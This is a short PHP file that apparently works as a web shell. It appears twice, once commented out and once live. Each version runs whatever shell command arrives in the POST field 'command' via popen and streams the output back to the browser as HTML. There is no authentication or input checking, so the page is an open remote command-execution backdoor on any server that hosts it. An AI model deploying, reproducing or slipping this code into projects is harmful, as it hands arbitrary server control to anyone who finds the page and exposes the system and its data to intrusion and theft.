<?php
/*if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];

    $handle = popen($command . ' 2>&1', 'r');
    if ($handle) {
        while (!feof($handle)) {
            $buffer = fgets($handle);
            echo nl2br($buffer); // convert newlines to HTML line breaks
            flush(); // flush the output buffer
        }
        pclose($handle);
    }
}*/
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];

    $handle = popen($command . ' 2>&1', 'r');
    if ($handle) {
        while (!feof($handle)) {
            $buffer = fgets($handle);
            $buffer = str_replace("\r\n", "\n", $buffer); // replace \r\n with \n
            echo nl2br($buffer); // convert newlines to HTML line breaks
            flush(); // flush the output buffer
        }
        pclose($handle);
    }
}
?>
